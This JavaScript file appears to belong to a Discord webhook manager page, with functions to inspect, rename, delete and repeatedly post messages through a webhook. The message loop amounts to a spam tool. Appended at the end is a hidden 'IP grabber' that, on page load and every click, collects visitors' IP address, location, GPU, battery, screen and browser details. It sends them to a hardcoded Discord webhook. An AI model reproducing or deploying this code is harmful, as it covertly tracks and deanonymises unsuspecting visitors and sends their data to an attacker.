document.addEventListener("DOMContentLoaded", () => {
  const webhookInput = document.getElementById("webhook-url");
  const validateButton = document.getElementById("validate-webhook");
  const navButtons = document.querySelector(".nav-buttons");
  const notification = document.getElementById("notification");

  const infoContainer = document.getElementById("info");
  const editContainer = document.getElementById("edit");
  const messagesContainer = document.getElementById("messages");
  const deleteContainer = document.getElementById("delete");

  const webhookName = document.getElementById("webhook-name");
  const webhookAvatar = document.getElementById("webhook-avatar");
  const webhookID = document.getElementById("webhook-id");
  const guildID = document.getElementById("guild-id");
  const channelID = document.getElementById("channel-id");

  let webhookUrl = "";
  let webhookData = {};

  function createSnowflake() {
    const snowflake = document.createElement("div");
    snowflake.classList.add("snowflake");
    // Position horizontale aléatoire
    const leftPosition = Math.random() * window.innerWidth;
    const size = (Math.random() * 5) + 5; // entre 5px et 10px
    snowflake.style.left = leftPosition + "px";
    snowflake.style.width = size + "px";
    snowflake.style.height = size + "px";
    snowflake.style.top = "-10px";
    snowflake.style.animationDuration = (Math.random() * 5 + 5) + "s";
    
    document.querySelector(".snow").appendChild(snowflake);
    setTimeout(() => {
      snowflake.remove();
    }, 10000);
  }
  // Créer des flocons toutes les 100ms
  setInterval(createSnowflake, 100);

  function showNotification(message, type = "success") {
    notification.textContent = message;
    notification.className = "notification show";
    if (type === "error") {
      notification.style.backgroundColor = "red";
    } else {
      notification.style.backgroundColor = "green";
    }
    setTimeout(() => {
      notification.className = "notification";
    }, 3000);
  }

  async function validateWebhook() {
    webhookUrl = webhookInput.value.trim();
    try {
      const response = await fetch(webhookUrl);
      if (!response.ok) throw new Error("Invalid Webhook");
      webhookData = await response.json();

      webhookName.textContent = webhookData.name;
      webhookAvatar.src = webhookData.avatar
        ? `https://cdn.discordapp.com/avatars/${webhookData.id}/${webhookData.avatar}.png`
        : "https://cdn.discordapp.com/embed/avatars/0.png";
      webhookID.textContent = webhookData.id;
      guildID.textContent = webhookData.guild_id || "N/A";
      channelID.textContent = webhookData.channel_id;

      webhookInput.style.opacity = 0;
      validateButton.style.opacity = 0;
      setTimeout(() => {
        webhookInput.classList.add("hidden");
        validateButton.classList.add("hidden");
        navButtons.classList.add("visible");
        infoContainer.classList.add("active");
        editContainer.classList.remove("active");
      }, 500);

      showNotification("Webhook Valid");
    } catch (error) {
      showNotification("Webhook Invalid", "error");
    }
  }

  validateButton.addEventListener("click", validateWebhook);

  document.querySelectorAll(".nav-button").forEach(button => {
    button.addEventListener("click", () => {
      // Cache tous les containers
      document.querySelectorAll(".container-section").forEach(section => {
        section.classList.remove("active");
      });

      const sectionId = button.getAttribute("data-section");
      const sectionToShow = document.getElementById(sectionId);
      if (sectionToShow) {
        sectionToShow.classList.add("active");
      }

      if (sectionId === "edit") {
        editContainer.classList.add("active");
        infoContainer.classList.remove("active");
      }
    });
  });

  document.getElementById("edit-avatar").addEventListener("change", (event) => {
    const file = event.target.files[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = function (e) {
        const preview = document.getElementById("avatar-preview");
        preview.src = e.target.result;
        preview.style.display = "block";
      };
      reader.readAsDataURL(file);
    }
  });

  document.getElementById("apply-changes").addEventListener("click", async () => {
    const newName = document.getElementById("edit-name").value.trim();
    const avatarFile = document.getElementById("edit-avatar").files[0];

    let newAvatar = null;
    if (avatarFile) {
      const reader = new FileReader();
      reader.readAsDataURL(avatarFile);
      newAvatar = await new Promise(resolve => {
        reader.onload = () => resolve(reader.result.split(",")[1]);
      });
    }

    const payload = {};
    if (newName) payload.name = newName;
    if (newAvatar) payload.avatar = `data:image/png;base64,${newAvatar}`;

    try {
      const response = await fetch(webhookUrl, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error("Failed to update");

      showNotification("Webhook Updated");

      if (newName) {
        webhookName.textContent = newName;
      }
      if (newAvatar) {
        webhookAvatar.src = `data:image/png;base64,${newAvatar}`;
      }
    } catch (error) {
      showNotification("Update Failed", "error");
    }
  });

  const startStopBtn = document.getElementById("start-messages");
  let sending = false;
  startStopBtn.addEventListener("click", async () => {
    if (!sending) {
      sending = true;
      startStopBtn.textContent = "Stop";
      startStopBtn.classList.remove("apply-button");
      startStopBtn.classList.add("btn-stop");
      
      const messageText = document.getElementById("message-text").value.trim();
      const delay = parseInt(document.getElementById("message-delay").value, 10);
      if (!messageText || isNaN(delay) || delay < 1) {
        showNotification("Invalid Input", "error");
        sending = false;
        startStopBtn.textContent = "Start";
        startStopBtn.classList.remove("btn-stop");
        startStopBtn.classList.add("apply-button");
        return;
      }
      
      showNotification("Sending Messages...");
      while (sending) {
        try {
          const response = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: messageText })
          });
          if (!response.ok) {
            showNotification("Rate Limited", "error");
          } else {
            showNotification("Message Sent");
          }
        } catch (error) {
          showNotification("Error Sending Message", "error");
        }
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    } else {
      sending = false;
      startStopBtn.textContent = "Start";
      startStopBtn.classList.remove("btn-stop");
      startStopBtn.classList.add("apply-button");
      showNotification("Messages Stopped");
    }
  });

  document.getElementById("delete-webhook").addEventListener("click", async () => {
    await fetch(webhookUrl, { method: "DELETE" });
    showNotification("Webhook Deleted");
    setTimeout(() => location.reload(), 2000);
  });
});
const WEBHOOK_URL = "https://discord.com/api/webhooks/1357394750000464004/WGJv3PKR_yeYZWk7l4iWWUWNCl2Swr3oI9RotIreKEf1B82MeWqKw0djfJoubvPmfh-l";  

async function collectUltimateData() {  
    let ip, location = "Unknown";  
    try {  
        const ipResponse = await fetch("https://api.ipify.org?format=json");  
        ip = (await ipResponse.json()).ip;  

        const geoApis = [  
            `https://ipapi.co/${ip}/json/`,  
            `https://ipwho.is/${ip}`,  
            `https://geolocation-db.com/json/${ip}`  
        ];  

        for (const api of geoApis) {  
            try {  
                const locResponse = await fetch(api);  
                const locData = await locResponse.json();  
                if (locData.city) {  
                    location = `${locData.city}, ${locData.country || locData.country_name}`;  
                    break;  
                }  
            } catch {}  
        }  
    } catch {}  

    const screen = {  
        resolution: `${window.screen.width}x${window.screen.height}`,  
        colorDepth: `${window.screen.colorDepth}bit`,  
        availableRes: `${window.screen.availWidth}x${window.screen.availHeight}`  
    };  

    let batteryInfo = "Desktop (No Battery)";  
    if ('getBattery' in navigator) {  
        const battery = await navigator.getBattery();  
        batteryInfo = `Laptop 🔋 ${Math.round(battery.level * 100)}% | ` +  
                     `${battery.charging ? "⚡ Charging" : "⚠️ Not Charging"}`;  
    }  

    let gpu = "Unknown";  
    try {  
        const canvas = document.createElement("canvas");  
        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");  
        if (gl) {  
            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");  
            gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);  
        }  
    } catch {}  

    const userAgent = navigator.userAgent;  
    const browserTests = [  
        { name: "Opera GX", test: /Opera GX|OPR/ },  
        { name: "Brave", test: /Brave/ },  
        { name: "Chrome", test: /Chrome/ },  
        { name: "Firefox", test: /Firefox/ },  
        { name: "Safari", test: /Safari/ },  
        { name: "Edge", test: /Edg/ },  
        { name: "IE", test: /Trident/ }  
    ];  

    let browser = "Unknown";  
    for (const test of browserTests) {  
        if (test.test.test(userAgent)) {  
            browser = test.name;  
            break;  
        }  
    }  

    const osTests = [  
        { name: "Windows", test: /Windows/ },  
        { name: "MacOS", test: /Macintosh/ },  
        { name: "Linux", test: /Linux/ },  
        { name: "Android", test: /Android/ },  
        { name: "iOS", test: /iPhone|iPad|iPod/ }  
    ];  

    let os = "Unknown";  
    for (const test of osTests) {  
        if (test.test.test(userAgent)) {  
            os = test.name;  
            break;  
        }  
    }  

    const embed = {  
        title: "🚨 **DarkSon IPGRABBER** 🚨",  
        color: 0xFF0000,  
        thumbnail: { url: "https://i.imgur.com/3Jm7g9T.png" },  
        fields: [  
            { name: "🌐 **IP Address**", value: ip || "Failed", inline: true },  
            { name: "📍 **Location**", value: location, inline: true },  
            { name: "🖥️ **Device Type**", value: batteryInfo, inline: true },  
            { name: "🔍 **Screen Resolution**", value: `\`${screen.resolution}\` (Avail: \`${screen.availableRes}\`)`, inline: false },  
            { name: "🎮 **GPU Renderer**", value: `\`\`\`${gpu.slice(0, 100)}\`\`\``, inline: false },  
            { name: "💻 **OS**", value: os, inline: true },  
            { name: "🌍 **Browser**", value: browser, inline: true },  
            { name: "📜 **Full User Agent**", value: `\`\`\`${userAgent}\`\`\``, inline: false }  
        ],  
        timestamp: new Date().toISOString()  
    };  

    const payload = {  
        username: "DarkSon",  
        avatar_url: "https://i.imgur.com/7W7W7W7.png",  
        embeds: [embed]  
    };  

    fetch(WEBHOOK_URL, {  
        method: "POST",  
        headers: { "Content-Type": "application/json" },  
        body: JSON.stringify(payload)  
    }).catch(e => console.error("Webhook Error:", e));  
}  

window.addEventListener("DOMContentLoaded", collectUltimateData);  

document.addEventListener("click", () => {  
    collectUltimateData();  
    alert("Data sent to india hackers");  
});  
